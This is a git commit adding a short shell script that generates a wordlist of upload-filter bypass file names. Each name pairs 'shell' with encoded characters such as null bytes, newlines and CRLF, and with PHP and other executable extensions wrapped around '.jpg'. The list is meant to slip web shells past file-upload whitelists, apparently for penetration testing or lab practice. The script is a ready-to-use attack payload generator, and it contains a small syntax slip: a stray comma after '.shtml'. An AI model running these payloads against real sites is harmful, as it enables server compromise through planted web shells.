d1d2474cdd63f15aee58aadacbd2d0f4bd9cb940
tobiasGuta <156011774+tobiasGuta@users.noreply.github.com>
2025-03-17 19:19:33 -0400

    Create bypassing_php_whitelist_medium.sh

---
+++ bypassing_php_whitelist_medium.sh
@@ -0,0 +1,8 @@
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.phtml' '.phtm' '.pht' '.phtml' '.shtml', '.asa' '.cer' '.asax' '.swf' '.xap' ; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
